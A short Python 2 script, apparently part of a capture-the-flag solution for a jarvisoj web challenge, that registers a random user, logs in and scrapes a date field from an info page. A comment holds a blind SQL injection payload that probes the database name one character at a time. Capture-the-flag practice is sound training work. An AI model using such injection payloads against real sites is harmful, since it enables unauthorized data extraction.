import requests
import re
import random

username = "badf" + str(random.randint(0, 100000))
# or(ascii(substr((select database()),1,1))='b')
S = requests.Session()

reg_url = "http://web.jarvisoj.com:32796/register.php"
data = {"country":"china", "username":username, "password":"bbb", "address":"ccc"}
res = S.post(reg_url, data=data)
print "1"

log_url = "http://web.jarvisoj.com:32796/login.php"
data = {"username":username, "password":"bbb"}
res = S.post(log_url, data=data)
print "2"

sql_url = "http://web.jarvisoj.com:32796/index.php?page=info"
res = S.get(sql_url)
# print res.content
print re.search(r'(?<=Date: <em>).*</em>', res.content).group()


